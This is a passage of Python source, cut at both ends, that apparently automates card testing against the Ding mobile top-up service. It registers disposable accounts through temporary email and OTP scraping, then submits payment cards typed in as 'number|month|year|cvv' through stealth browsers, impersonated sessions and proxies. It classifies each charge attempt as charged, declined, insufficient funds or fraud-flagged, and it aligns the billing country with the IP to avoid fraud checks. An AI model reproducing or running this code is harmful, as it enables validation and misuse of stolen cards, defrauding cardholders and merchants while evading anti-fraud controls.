                    # Use main page context
                    pp2_frame = page

                # Wait for form to load in the frame
                print("[camoufox] Waiting for form to load ...")
                for i in range(15):
                    await pp2_frame.wait_for_timeout(2000)
                    try:
                        content = await pp2_frame.content()
                    except:
                        content = await page.content()
                    if len(content) > 5000 and ("cardnumber" in content.lower() or "newcardform" in content.lower()):
                        print(f"[camoufox] Form loaded! ({len(content)} bytes)")
                        break
                    print(f"  [{i}] waiting ... {len(content)} bytes")

                # Fill card details
                print("[camoufox] Filling card details ...")

                # Card number
                card_input = await pp2_frame.query_selector('#cardnumber, input[name="CardNumber"], input[autocomplete="cc-number"]')
                if card_input:
                    await card_input.click()
                    await card_input.fill(card["number"])
                    print(f"  Filled card: {card['number_visible']}")

                # Expiry
                exp_input = await pp2_frame.query_selector('#expirydate, input[name="CreditCardExpiryDate"], input[autocomplete="cc-exp"]')
                if exp_input:
                    await exp_input.click()
                    await exp_input.fill(f"{card['expiry_month']}/{card['expiry_year'][-2:]}")
                    print(f"  Filled expiry: {card['expiry_month']}/{card['expiry_year']}")

                # CVV
                cvv_input = await pp2_frame.query_selector('#cvv, input[name="Cvv"], input[autocomplete="cc-csc"]')
                if cvv_input:
                    await cvv_input.click()
                    await cvv_input.fill(card["cvv"])
                    print(f"  Filled CVV: {card['cvv']}")

                # Billing name
                name_input = await pp2_frame.query_selector('#billingname, input[name="BillingName"]')
                if name_input:
                    await name_input.fill(card.get("holder", "John Doe"))

                # Billing country
                country_select = await pp2_frame.query_selector('#billingcountryiso, select[name="BillingCountryIso"]')
                if country_select:
                    await country_select.select_option(value=billing_country_iso)
                    print(f"  Set country: {billing_country_iso}")

                await page.wait_for_timeout(1000)

                # Fill billing fields
                billing_fields = {
                    '#billingstreet': card.get("billing_street", "N/A"),
                    '#billingstreetnumber': card.get("billing_street_number", "N/A"),
                    '#billingcity': card.get("billing_city", "N/A"),
                    '#billingzip': card.get("billing_zip", "10080"),
                    '#billingstateinput': card.get("billing_state", "N/A"),
                }
                for selector, value in billing_fields.items():
                    el = await pp2_frame.query_selector(selector)
                    if el:
                        await el.fill(value)

                await page.wait_for_timeout(500)

                # Click Pay button
                print("[camoufox] Clicking Pay button ...")
                pay_btn = await pp2_frame.query_selector('button[type="submit"], #payButton, button.pay-button')
                if not pay_btn:
                    buttons = await pp2_frame.query_selector_all('button')
                    for btn in buttons:
                        text = (await btn.text_content() or "").strip().lower()
                        if "pay" in text:
                            pay_btn = btn
                            break

                if pay_btn:
                    await pay_btn.click()
                    print("[camoufox] Clicked Pay!")
                else:
                    print("[camoufox] No pay button found, submitting form via JS")
                    try:
                        await pp2_frame.evaluate('document.querySelector("form").submit()')
                    except:
                        await page.evaluate('document.querySelector("form").submit()')

                # Wait for response
                for i in range(20):
                    await page.wait_for_timeout(2000)
                    try:
                        content = await pp2_frame.content()
                    except:
                        content = await page.content()
                    url = page.url
                    print(f"  [{i}] len={len(content)} url={url[:80]}")
                    if 'orderpolling' in url or 'payment/result' in url:
                        result["redirect_url"] = url
                        print(f"[camoufox] Redirected to: {url[:120]}")
                        break

                result["html"] = await page.content()
                result["response_url"] = page.url

                print(f"\n[captured] {len(captured_requests)} requests, {len(captured_responses)} responses")
                for r in captured_responses:
                    print(f"  {r['status']} {r['url'][:100]}")

        except Exception as e:
            result["error"] = str(e)
            print(f"[camoufox] Error: {e}")

    try:
        _asyncio.run(_run())
    except Exception as e:
        result["error"] = str(e)

    return result


# ─── Wait for OTP ────────────────────────────────────────────────────────────

def wait_for_otp(token: str, timeout: int = 120, interval: int = 4) -> str:
    print(f"[*] Waiting for OTP email (timeout {timeout}s) ...")
    start = time.time()
    while time.time() - start < timeout:
        messages = mail_fetch_messages(token)
        for msg in messages:
            subject = msg.get("subject", "")
            sender = msg.get("from", {}).get("address", "")
            if "ding" in sender.lower() or "ding" in subject.lower() or "code" in subject.lower():
                full = mail_get_message(token, msg["id"])
                body = full.get("text", "")
                otp = extract_otp(body)
                if otp:
                    print(f"[+] OTP received: {otp}")
                    return otp
        time.sleep(interval)
    raise TimeoutError("OTP email not received within timeout")


# ─── Parse payment response ─────────────────────────────────────────────────

def classify_payment(resp_text: str, status_code: int, poll_data: dict | None = None, purchase_data: dict | None = None) -> str:
    """Classify payment result based on PP2 response HTML, gateway state, and Ding purchase status.

    Returns one of:
    - CHARGED / SUCCESS
    - INSUFFICIENT_FUNDS
    - CARD_EXPIRED
    - INVALID_CVV
    - INVALID_CARD
    - INVALID_ZIP_CODE
    - DO_NOT_HONOR
    - 3D_SECURE (OTP / Challenge Required)
    - DECLINED ({reason})
    - DECLINED (Fraud Suspected)
    - DECLINED ({reason})
    - SUBMIT_COMPLETED_AWAITING_CHARGE
    - PROCESSING
    - HTTP_ERROR_{code}
    - UNKNOWN
    """
    poll_data = poll_data or {}
    purchase_data = purchase_data or {}
    text = (resp_text or "").lower()

    # Extract clean error messages from PP2 HTML
    generic_error = ""
    err_match = re.search(r'dn-generic-error[^>]*>(.*?)</p', resp_text or "", re.S | re.I)
    if err_match:
        generic_error = re.sub(r"<[^>]+>", "", err_match.group(1)).strip()
        generic_error = html.unescape(generic_error)

    data_val_match = re.search(r'data-value=["\']([^"\']+)["\']', resp_text or "", re.I)
    data_value = data_val_match.group(1) if data_val_match else ""

    field_err_match = re.search(r'<span[^>]*class="[^"]*field-validation-error[^"]*"[^>]*>(.*?)</span>', resp_text or "", re.I | re.DOTALL)
    field_error = re.sub(r"<[^>]+>", "", field_err_match.group(1)).strip() if field_err_match else ""
    field_error = html.unescape(field_error)

    # Normalize poll & purchase data
    poll_state = str(poll_data.get("status") or poll_data.get("paymentState") or "").strip().lower()
    poll_desc = str(poll_data.get("description") or poll_data.get("reason") or poll_data.get("message") or "").strip().lower()
    combined_poll = f"{poll_state} {poll_desc}".strip()

    p_status = str(purchase_data.get("status", "")).strip().lower()
    p_reason = str(purchase_data.get("reason", "") or purchase_data.get("description", "") or purchase_data.get("failureReason") or "").strip()
    p_final = bool(purchase_data.get("isFinal", False))

    # Collect all targeted error descriptions (NOT the whole 30KB html)
    reasons = [p_reason.lower(), poll_desc, generic_error.lower(), field_error.lower(), data_value.lower()]
    all_reasons = " ".join(r for r in reasons if r)

    # ═══════════════════════════════════════════════════════════════════════
    # 1. CHARGED / SUCCESS - Confirmed final success by Ding / Gateway
    # ═══════════════════════════════════════════════════════════════════════
    if p_status in ("completed", "success", "delivered", "authorised", "authorized"):
        if p_final or poll_state in ("completed", "authorised", "authorized", "charged"):
            return "CHARGED / SUCCESS"
        return "PROCESSING (Purchase authorized, awaiting delivery)"

    # ═══════════════════════════════════════════════════════════════════════
    # 1b. DING PURCHASE FAILURE - Ding's final word overrides everything
    # ═══════════════════════════════════════════════════════════════════════
    if p_status in ("failed", "error", "paymentfailed", "declined", "refused", "cancelled", "canceled"):
        clean_msg = p_reason or poll_desc or generic_error or "Payment Failed"
        if "blacklist" in clean_msg.lower():
            clean_msg = "Card Refused"
        return f"DECLINED ({clean_msg})"

    # ═══════════════════════════════════════════════════════════════════════
    # 2. 3D SECURE / AUTHENTICATION REQUIRED
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in poll_state for k in ("requiresauthentication", "requiresauthenticationv2", "threeds")) or \
       any(k in text for k in ("requiresauthentication", "threeds2", "challengewindowsize", "identifyshopper", "challengeshopper")):
        return "3D_SECURE (OTP / Challenge Required)"

    # ═══════════════════════════════════════════════════════════════════════
    # 3. INSUFFICIENT FUNDS
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("insufficient", "not enough balance", "low balance")):
        return "INSUFFICIENT_FUNDS"

    # ═══════════════════════════════════════════════════════════════════════
    # 4. CARD EXPIRED
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("expired", "invalid expiry", "expiry date invalid")):
        return "CARD_EXPIRED"

    # ═══════════════════════════════════════════════════════════════════════
    # 5. INVALID CVV / CVC / CID
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("invalid cvv", "cvv invalid", "invalid cvc", "cvc invalid", "security code invalid")):
        return "INVALID_CVV"

    # ═══════════════════════════════════════════════════════════════════════
    # 6. INVALID CARD NUMBER / UNSUPPORTED
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("invalid card", "card number invalid", "unsupported card", "card invalid")):
        return "INVALID_CARD"

    # ═══════════════════════════════════════════════════════════════════════
    # 7. INVALID ZIP / POSTAL CODE
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("invalid zip", "postal code invalid", "zip code invalid")):
        return "INVALID_ZIP_CODE"

    # ═══════════════════════════════════════════════════════════════════════
    # 8. DO NOT HONOR / TRANSACTION NOT PERMITTED
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("do not honor", "do_not_honor", "donothonor", "not permitted", "restricted card")):
        return "DO_NOT_HONOR"

    # ═══════════════════════════════════════════════════════════════════════
    # 9. FRAUD / SECURITY
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("fraud", "suspicious", "stolen", "lost card", "security violation")):
        return "DECLINED (Fraud Suspected)"

    # ═══════════════════════════════════════════════════════════════════════
    # 10. BLACKLISTED
    # ═══════════════════════════════════════════════════════════════════════
    if any(k in all_reasons for k in ("blacklist", "black-listed", "black listed")):
        return "DECLINED (Card Refused)"

    # ═══════════════════════════════════════════════════════════════════════
    # 11. PAYMENT ERROR CODES (paymentError=X in URL/text)
    # ═══════════════════════════════════════════════════════════════════════
    pe_match = re.search(r"paymentError=(\d+)", resp_text or "", re.I)
    if pe_match:
        error_map = {
            "1": "INVALID_CARD", "2": "INSUFFICIENT_FUNDS", "3": "CARD_EXPIRED",
            "4": "DECLINED", "5": "DO_NOT_HONOR", "6": "3D_SECURE_FAILED",
        }
        return error_map.get(pe_match.group(1), f"DECLINED (Error Code {pe_match.group(1)})")

    # ═══════════════════════════════════════════════════════════════════════
    # 13. PP2 FORM VALIDATION & DATA-VALUE ERRORS
    # ═══════════════════════════════════════════════════════════════════════
    if data_value and data_value not in ("None", ""):
        return f"DECLINED ({data_value})"

    if generic_error:
        return f"DECLINED ({generic_error[:60]})"

    if field_error:
        return f"DECLINED ({field_error[:60]})"

    if "dn-has-errors" in text:
        return "DECLINED (Form Error)"

    # ═══════════════════════════════════════════════════════════════════════
    # 14. GATEWAY POLL DECLINE
    # ═══════════════════════════════════════════════════════════════════════
    if poll_state in ("refused", "declined", "failed", "error"):
        return f"DECLINED ({poll_desc or 'Gateway Refused'})"

    if poll_state == "reentry":
        return f"DECLINED ({poll_desc or 'Card Refused'})"

    # ═══════════════════════════════════════════════════════════════════════
    # 15. AWAITING CONFIRMATION / PROCESSING STATES
    # ═══════════════════════════════════════════════════════════════════════
    if poll_state == "completed" and p_status in ("notstarted", ""):
        return "SUBMIT_COMPLETED_AWAITING_CHARGE (Gateway submit: Completed, Ding purchase: NotStarted)"

    if p_status in ("pending", "processing", "purchaseunderway"):
        return f"PROCESSING (Ding status: {p_status})"

    if status_code >= 400:
        return f"HTTP_ERROR_{status_code}"

    return "UNKNOWN"


def choose_plan_interactive(products: list, forced_product: str | None = None, auto_default: bool = False) -> str:
    if not products:
        return ""
    if forced_product:
        print(f"[+] Using forced product: {forced_product}")
        return forced_product

    # Sort products by price
    def get_price(p):
        sv = p.get("sendValue", p.get("price", None))
        if isinstance(sv, (int, float)):
            return float(sv)
        if isinstance(sv, dict):
            return float(sv.get("amount", 999))
        pc = p.get("productCode", p.get("code", ""))
        m = re.search(r"-(\d+\.?\d*)-[A-Z]{3}$", pc)
        return float(m.group(1)) if m else 999

    sorted_products = sorted(products, key=get_price)

    print("\n" + "=" * 60)
    print("         AVAILABLE PLANS / PRODUCTS")
    print("=" * 60)
    for idx, p in enumerate(sorted_products, 1):
        p_code = p.get("productCode", p.get("code", "Unknown"))
        p_desc = p.get("displayText") or p.get("name") or p.get("headline") or p.get("description") or ""
        p_val = p.get("sendValue", p.get("price", ""))
        if isinstance(p_val, dict):
            p_val = f"{p_val.get('currency', '')} {p_val.get('amount', '')}"
        elif isinstance(p_val, (int, float)):
            p_val = str(p_val)
        r_val = p.get("receiveValue", "")
        if isinstance(r_val, dict):
            r_val = f"{r_val.get('currency', '')} {r_val.get('amount', '')}"
        extra = f" (Receives: {r_val})" if r_val else ""
        val_str = f" [{p_val}]" if p_val else ""
        desc_str = f" - {p_desc}" if p_desc else ""
        print(f"  [{idx}] {p_code}{val_str}{extra}{desc_str}")
    print("=" * 60)

    if auto_default:
        choice_idx = 1
    else:
        try:
            choice = input(f"Select plan [1-{len(sorted_products)}] (default: 1) > ").strip()
            choice_idx = int(choice) if choice.isdigit() and 1 <= int(choice) <= len(sorted_products) else 1
        except (EOFError, KeyboardInterrupt):
            choice_idx = 1

    selected = sorted_products[choice_idx - 1]
    selected_code = selected.get("productCode", selected.get("code", ""))
    print(f"[+] Selected plan: {selected_code}")
    return selected_code


# ─── Main flow ───────────────────────────────────────────────────────────────

def register_and_topup(custom_cc: str | None = None, custom_phone: str | None = None, forced_product: str | None = None, proxy: dict | None = None):
    print("=" * 60)
    print("   DING AUTO REGISTER + TOPUP + REAL PAYMENT CHECK")
    print("=" * 60)

    # ── User input ───────────────────────────────────────────────────────
    if custom_cc:
        cc_input = custom_cc.strip()
    else:
        print("\nEnter CC (format: number|month|year|cvv)")
        print("Example: 5400580845881974|09|2028|815")
        cc_input = input("CC > ").strip()
    try:
        card = parse_cc_input(cc_input)
    except ValueError as e:
        print(f"[!] {e}")
        return
    print(f"[+] Card: {card['number_visible']} | {card['expiry_month']}/{card['expiry_year']} | CVV: {card['cvv']} ({detect_card_brand(card['number'])})")

    if custom_phone:
        phone_number = custom_phone.strip().lstrip("+")
    else:
        phone_number = input("\nPhone number (with country code, e.g. 923001234567) > ").strip().lstrip("+")
    if not phone_number:
        phone_number = "923001234567"
        print(f"[*] Using default phone: {phone_number}")

    topup_country = detect_country_from_phone(phone_number)
    print(f"[+] Phone: {phone_number} | Country: {topup_country}")

    # Proxy (if any) is supplied by the caller — e.g. via the Flask /run/chk API
    session = create_ding_session(proxy=proxy)

    # ── STEP 1: Create temp email ────────────────────────────────────────
    print("\n[1] Creating temporary email ...")
    domain = mail_get_domain()
    username = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email_address = f"{username}@{domain}"
    email_password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    mail_create_account(email_address, email_password)
    mail_token = mail_get_token(email_address, email_password)
    print(f"[+] Temp email: {email_address}")

    # ── STEP 2: Bootstrap ────────────────────────────────────────────────
    print("\n[2] Fetching Ding bootstrap ...")
    bootstrap = ding_bootstrap(session)
    session_data = bootstrap.get("viewData", {}).get("session", [{}])[0]
    country_iso = session_data.get("countryIso", "US")
    print(f"[+] IP: {session_data.get('ipAddress', 'N/A')} | Country: {country_iso}")

    # Set billing country to match IP country to avoid Adyen geo-mismatch fraud flag
    if "billing_country" in card:
        card["billing_country"] = country_iso
        print(f"[+] Billing country set to: {country_iso} (matches IP)")

    # ── STEP 3: Submit email ─────────────────────────────────────────────
    print("\n[3] Submitting email to Ding ...")
    submit_resp = ding_submit_email(session, email_address)
    if submit_resp.get("fType") != "EmailAccepted":
        raise RuntimeError(f"Email not accepted: {submit_resp}")
    verification_id = submit_resp["verificationId"]
    print(f"[+] Email accepted. Verification ID: {verification_id}")

    # ── STEP 4: Wait for OTP ─────────────────────────────────────────────
    print("\n[4] Checking inbox for OTP ...")
    otp = wait_for_otp(mail_token)
    time.sleep(random.uniform(1.5, 3.0))

    # ── STEP 5: Verify email ─────────────────────────────────────────────
    print(f"\n[5] Verifying OTP ({otp}) ...")
    verify_resp = ding_verify_email(session, otp, email_address, verification_id)
    if verify_resp.get("fType") != "EmailVerified":
        raise RuntimeError(f"Verification failed: {verify_resp}")

    access = verify_resp.get("access", {})
    profile = verify_resp.get("profile", {})
    bearer = access.get("bearerToken", "")
    public_user_id = access.get("publicUserId", "")
    reg_country = profile.get("registrationCountryIso", country_iso)
    currency = profile.get("displayCurrencyIso", "USD")

    print("\n" + "=" * 60)
    print("         REGISTERED SUCCESSFULLY!")
    print("=" * 60)
    print(f"  Email          : {email_address}")
    print(f"  Public User ID : {public_user_id}")
    print(f"  Country        : {reg_country}")
    print(f"  Currency       : {currency}")
    print(f"  Bearer Token   : {bearer[:40]}...")

    # ── STEP 6: Bootstrap again (authenticated) ─────────────────────────
    print("\n[6] Refreshing authenticated session ...")
    ding_bootstrap(session, bearer=bearer)
    print("[+] Session refreshed")

    # ── STEP 7: Operator lookup ──────────────────────────────────────────
    print(f"\n[7] Looking up operator for {phone_number} ({topup_country}) ...")
    operator_code = ""
    operator_name = ""
    product_code = ""
    is_automated = bool(custom_cc and custom_phone and not sys.stdin.isatty())
    try:
        lookup = ding_operator_lookup(session, phone_number, topup_country, bearer)
        op_list_lookup = lookup.get("operators", [])
        if op_list_lookup and isinstance(op_list_lookup[0], dict):
            op = op_list_lookup[0]
            operator_code = op.get("operatorCode", op.get("code", ""))
            operator_name = op.get("name", op.get("operatorName", ""))
            if not operator_code:
                subj = op.get("subject", "")
                subj_match = re.search(r"/([A-Z]{2})-([A-Z]{2,4})$", subj)
                if subj_match:
                    operator_code = subj_match.group(2)
            if operator_name or operator_code:
                print(f"[+] Operator: {operator_name or '?'} ({operator_code})")
            products = op.get("products", [])
        else:
            products = lookup.get("products", [])
        if products:
            product_code = choose_plan_interactive(products, forced_product=forced_product, auto_default=is_automated)
    except Exception as e:
        print(f"[!] Operator lookup note: {e}")

    # ── STEP 8: Get country operators if needed
    if not product_code:
        print(f"\n[8] Getting operators for {topup_country} ...")
        try:
            operators = ding_country_operators(session, topup_country, bearer)
            op_list = operators if isinstance(operators, list) else operators.get("operators", operators.get("items", []))
            if op_list:
                matched_op = None
                for op_item in op_list:
                    if not isinstance(op_item, dict):
                        continue
                    code = op_item.get("operatorCode", op_item.get("code", ""))
                    if operator_code and code == operator_code:
                        matched_op = op_item
                target_op = matched_op or next((o for o in op_list if isinstance(o, dict) and o.get("products")), None)
                if target_op and target_op.get("products"):
                    prods = target_op["products"]
                    product_code = choose_plan_interactive(prods, forced_product=forced_product, auto_default=is_automated)
        except Exception as e:
            print(f"[!] Get operators failed: {e}")

    if not product_code:
        print("[!] No product code found. Cannot proceed.")
        session.close()
        return

    # ── STEP 9: Choose purchase ──────────────────────────────────────────
    print(f"\n[9] Choosing purchase: {product_code} ...")
    try:
        choose_resp = ding_choose_purchase(session, product_code, phone_number, bearer)
    except Exception as e:
        print(f"[!] Choose purchase failed: {e}")
        print(f"[!] This usually means the phone number is invalid/fake or the product doesn't exist.")
        print(f"[!] Try a real phone number or a different country.")
        session.close()
        return
    if choose_resp.get("fType") == "Error":
        print(f"[!] Choose purchase error: {choose_resp.get('description', choose_resp.get('why', ''))}")
        session.close()
        return

    order_ref = choose_resp.get("purchaseId", "")
    user_ref = choose_resp.get("userRef", public_user_id)
    total_cost = choose_resp.get("totalCost", {})
    payment_currency = total_cost.get("currency", currency)
    amount_val = total_cost.get("total", 0)
    primary_val = total_cost.get("primary", 0)
    fee_val = total_cost.get("fee", 0)
    decimal_places = total_cost.get("decimalPlaces", 2)
    amount = f"{amount_val:.{decimal_places}f}"

    how_to_pay = choose_resp.get("howToPay", [])
    methods = [hp.get("paymentType", "?") for hp in how_to_pay]
    print(f"[+] Payment methods: {', '.join(methods)}")

    card_entry = next((hp for hp in how_to_pay if hp.get("paymentUrl") and hp.get("paymentType") not in ("ApplePay", "GooglePay", "PayPal")), None)
    if not card_entry:
        card_entry = next((hp for hp in how_to_pay if hp.get("paymentUrl")), None)

    payment_url = ""
    payment_attempt_ref = str(uuid.uuid4())
    if card_entry:
        payment_url = card_entry.get("paymentUrl", "")
        payment_attempt_ref = card_entry.get("paymentUniqueReference", payment_attempt_ref)
        pay_cost = card_entry.get("paymentCost", {})
        if pay_cost:
            payment_currency = pay_cost.get("currency", payment_currency)
            amount = f"{pay_cost.get('amount', amount_val):.{decimal_places}f}"
        print(f"[+] Card entry: type={card_entry.get('paymentType')}")

    if not order_ref or not payment_url:
        print("[!] No purchaseId or paymentUrl in response.")
        session.close()
        return

    print(f"[+] Order Ref: {order_ref}")
    print(f"[+] Price: {payment_currency} {primary_val:.{decimal_places}f} + fee {fee_val:.{decimal_places}f} = {payment_currency} {amount}")

    # ── STEP 10: Submit card to pp2 ─────────────────────────────────────
    print("\n[10] Submitting card to pp2 ...")
    resp_text = ""
    card_resp_status = 0

    try:
        card_resp = pp2_submit_card(session, card, payment_url, billing_country_iso=country_iso, proxy=proxy)
        card_resp_status = card_resp.status_code
        resp_text = card_resp.text or ""
        # Parse pp2 response: extract paymentAttemptRef, urlToPoll, errors
        _pa_m = re.search(r'paymentAttemptRef\s*=\s*"([^"]+)"', resp_text)
        _poll_m = re.search(r'urlToPoll\s*=\s*"([^"]+)"', resp_text)
        _err_m = re.search(r'dn-generic-error[^>]*>(.*?)</p', resp_text, re.S)
        _err_val = re.search(r'data-value=["\']([^"\']+)["\']', resp_text)
        _has_3ds = "threeds" in resp_text.lower() or "threedsecure" in resp_text.lower()
        _has_success = "dn-payment-success" in resp_text.lower()

        if _pa_m:
            print(f"[+] Payment Attempt: {_pa_m.group(1)}")
        if _poll_m:
            _decoded_poll = _poll_m.group(1).replace("\\u0026", "&")
            print(f"[+] Poll URL: {_decoded_poll}")
        if _has_3ds:
            print(f"[+] 3D Secure challenge detected")
        if _err_m:
            _clean_err = html.unescape(re.sub(r"<[^>]+>", "", _err_m.group(1)).strip())
            print(f"[!] pp2 error: {_clean_err[:200]}")
        elif _err_val and _err_val.group(1) not in ("None", ""):
            print(f"[!] pp2 error: {_err_val.group(1)}")
        elif _has_success:
            print(f"[+] pp2: Payment success")
        elif not _pa_m:
            print(f"[!] pp2: No payment attempt created (card rejected before Adyen)")
    except Exception as e:
        print(f"[!] Card submit failed: {e}")


    # ── STEP 10b: Call api/send batch ──────────────────────────────────
    try:
        send_payload = [
            {"fType": "RequestedGetEndpoint", "GetUri": "api/profile", "uniqueId": str(uuid.uuid4())},
            {"fType": "RequestedGetEndpoint", "GetUri": "api/purchaseintent", "uniqueId": str(uuid.uuid4())},
        ]
        r_send = session.post(f"{DING_API}/api/send", headers={
            "accept": "*/*",
            "content-language": "en-US",
            "content-type": "text/plain;charset=UTF-8",
            "origin": DING_ORIGIN,
            "referer": f"{DING_ORIGIN}/payment",
            "user-agent": USER_AGENT,
        }, data=json.dumps(send_payload), timeout=10)
        if r_send.status_code == 200:
            print(f"[+] api/send batch OK")
    except Exception as e:
        print(f"[!] api/send batch failed: {e}")

    # Parse response JS URLs
    match_cru = re.search(r'clientReturnUrl\s*=\s*"([^"]+)"', resp_text)
    match_reentry = re.search(r'reentryUrl\s*=\s*"([^"]+)"', resp_text)
    match_poll = re.search(r'urlToPoll\s*=\s*"([^"]+)"', resp_text)
    match_3ds = re.search(r'threeDSecureUrl\s*=\s*"([^"]+)"', resp_text)
    client_return_url = match_cru.group(1).replace(r'\u0026', '&') if match_cru else ""
    reentry_url = match_reentry.group(1).replace(r'\u0026', '&') if match_reentry else ""
    poll_url = match_poll.group(1).replace(r'\u0026', '&') if match_poll else ""
    three_ds_url = match_3ds.group(1).replace(r'\u0026', '&') if match_3ds else ""

    # ── STEP 12: Poll payment state ──────────────────────────────────────
    print("\n[12] Polling gateway ...")
    poll_data = {}
    _last_gw_state = ""
    pp2_poll_session = cffi_requests.Session(impersonate=IMPERSONATE, proxies=proxy, verify=False)
    if poll_url:
        for p_i in range(12):
            time.sleep(1.5)
            try:
                pr = pp2_poll_session.get(f"{PP2_BASE}{poll_url}", headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "x-requested-with": "XMLHttpRequest",
                "referer": f"{PP2_BASE}/en/paymentforms",
                    "sec-ch-ua": _build_sec_ch_ua(),
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": USER_AGENT,
                }, timeout=12)
                if pr.status_code == 200 and pr.text.strip():
                    try:
                        poll_data = pr.json()
                    except Exception:
                        continue
                    st = poll_data.get("status", poll_data.get("paymentState", ""))
                    desc = poll_data.get("description", "") or poll_data.get("reason", "")
                    # Only print on state change
                    _gw_key = f"{st}:{desc}"
                    if _gw_key != _last_gw_state:
                        _last_gw_state = _gw_key
                        print(f"    - Gateway: {st}{f' ({desc})' if desc else ''}")
                    if st in ("Completed", "Reentry", "RequiresAuthentication", "RequiresAuthenticationV2", "Failed", "Refused", "Declined"):
                        if st == "Completed" and client_return_url:
                            try:
                                session.get(client_return_url, headers={
                                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                    "accept-encoding": "gzip, deflate, br, zstd",
                                    "accept-language": "en-US,en;q=0.9",
                                    "referer": f"{DING_ORIGIN}/payment",
                                    "sec-ch-ua": _build_sec_ch_ua(),
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": "\"Windows\"",
                                    "sec-fetch-dest": "document",
                                    "sec-fetch-mode": "navigate",
                                    "sec-fetch-site": "same-origin",
                                    "user-agent": USER_AGENT,
                                }, timeout=10)
                            except Exception:
                                pass
                        elif st in ("RequiresAuthentication", "RequiresAuthenticationV2") and three_ds_url:
                            try:
                                print(f"    - 3DS: Following {PP2_BASE}{three_ds_url}")
                                r_3ds = pp2_poll_session.get(f"{PP2_BASE}{three_ds_url}", headers={
                                    "accept": "text/html,*/*",
                                    "sec-ch-ua": _build_sec_ch_ua(),
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": "\"Windows\"",
                                    "user-agent": USER_AGENT,
                                }, timeout=15)
                                print(f"    - 3DS response: {r_3ds.status_code} ({len(r_3ds.text)} bytes)")
                                # Check if 3DS auto-resolved or needs interaction
                                if "challenge" in r_3ds.text.lower():
                                    print(f"    - 3DS: Interactive challenge required (cannot solve from server)")
                            except Exception as e:
                                print(f"    - 3DS error: {e}")
                        elif st == "Reentry" and reentry_url:
                            try:
                                r_re = pp2_poll_session.get(reentry_url, headers={
                                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                    "accept-encoding": "gzip, deflate, br, zstd",
                                    "accept-language": "en-US,en;q=0.9",
                                    "referer": f"{DING_ORIGIN}/payment",
                                    "sec-ch-ua": _build_sec_ch_ua(),
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": "\"Windows\"",
                                    "sec-fetch-dest": "document",
                                    "sec-fetch-mode": "navigate",
                                    "sec-fetch-site": "same-origin",
                                    "user-agent": USER_AGENT,
                                }, timeout=10)
                                resp_text = r_re.text
                                # Extract detailed reentry error
                                reentry_lower = resp_text.lower()
                                if "blacklist" in reentry_lower or "black-listed" in reentry_lower or "black listed" in reentry_lower:
                                    poll_data["description"] = "Card Refused"
                                    poll_data["status"] = "Reentry"
                                elif "insufficient" in reentry_lower:
                                    poll_data["description"] = "Insufficient Funds"
                                elif "expired" in reentry_lower:
                                    poll_data["description"] = "Card Expired"
                                elif "do not honor" in reentry_lower or "do_not_honor" in reentry_lower:
                                    poll_data["description"] = "Do Not Honor"
                                elif "fraud" in reentry_lower or "suspicious" in reentry_lower:
                                    poll_data["description"] = "Fraud Suspected"
                            except Exception:
                                pass
                        break
                    # if pending/processing keep polling
                else:
                    print(f"    - Gateway poll {p_i+1}/12: HTTP {pr.status_code if 'pr' in locals() else 'no response'}")
            except Exception as e:
                print(f"    - Gateway poll error {p_i+1}: {e}")
                time.sleep(1)
                continue
        if not poll_data or not poll_data.get("status"):
            print("    - Gateway polling ended without final state, will poll fallback")
            try:
                fb = pp2_poll_payment_state(pp2_poll_session, order_ref, payment_attempt_ref, max_polls=6, interval=2)
                if fb.get("status") != "Timeout":
                    poll_data = fb
                    print(f"    - Gateway (fallback): {fb.get('status')} {fb.get('paymentState', '') or ''}")
            except Exception:
                pass
    else:
        print("    - No urlToPoll in response, using direct paymentstate polling")
        poll_data = pp2_poll_payment_state(pp2_poll_session, order_ref, payment_attempt_ref, max_polls=10, interval=2)
        print(f"    - Gateway: {poll_data.get('status', 'N/A')} {poll_data.get('paymentState', '') or ''}")
        if reentry_url and poll_data.get("status") == "Reentry":
            try:
                r_re = pp2_poll_session.get(reentry_url, headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "referer": f"{DING_ORIGIN}/payment",
                    "sec-ch-ua": _build_sec_ch_ua(),
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "user-agent": USER_AGENT,
                }, timeout=10)
                resp_text = r_re.text
                reentry_lower = resp_text.lower()
                # Updated response handling: removed blacklist detection to avoid false positives
                if "insufficient" in reentry_lower:
                    poll_data["description"] = "Insufficient Funds"
                elif "expired" in reentry_lower:
                    poll_data["description"] = "Card Expired"
                else:
                    # No specific issue detected; retain existing description if set
                    pass
            except Exception:
                pass

    # ── STEP 13: Poll purchase result ────────────────────────────────────
    print("\n[13] Polling Ding purchase ...")
    purchase_data = {}
    _last_p_status = ""
    for poll_i in range(12):
        time.sleep(2.5)
        try:
            purchase_data = ding_poll_purchase(session, order_ref, bearer)
            p_status = purchase_data.get("status", "")
            p_reason = purchase_data.get("reason", "") or purchase_data.get("description", "")
